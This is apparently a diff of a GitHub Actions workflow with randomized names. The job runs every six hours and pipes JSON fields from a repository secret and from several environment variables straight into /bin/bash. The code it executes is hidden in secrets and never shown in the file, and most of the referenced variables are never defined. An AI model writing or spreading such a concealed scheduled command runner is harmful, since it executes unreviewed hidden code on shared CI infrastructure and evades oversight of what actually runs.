@@ -1,9 +1,8 @@
 name: suguimi4356
-
 on:
   workflow_dispatch:
   schedule:
-    - cron: '19 3/6 * * *'
+    - cron: '20 5/6 * * *'
 jobs:
   build:
     runs-on: ubuntu-latest
@@ -12,8 +11,11 @@ jobs:
       - uses: actions/checkout@v4
       - name: suguimi4356
         env:
-          emil91442: ${{ secrets.emil91442 }}
+          g38874: ${{ secrets.g38874 }}
         run: |
-          echo $emil91442 | jq -r .gsve1 | /bin/bash
-          echo $i63 | jq -r .jt33407 | /bin/bash
+          echo $g38874 | jq -r .ys38 | /bin/bash
+          echo $j1278 | jq -r .yu103 | /bin/bash
+          echo $h96210 | jq -r .ojtlt90579 | /bin/bash
+          echo $eqnu0426 | jq -r .wsyzk32195 | /bin/bash
+          echo $j31373 | jq -r .eqc40421 | /bin/bash
 
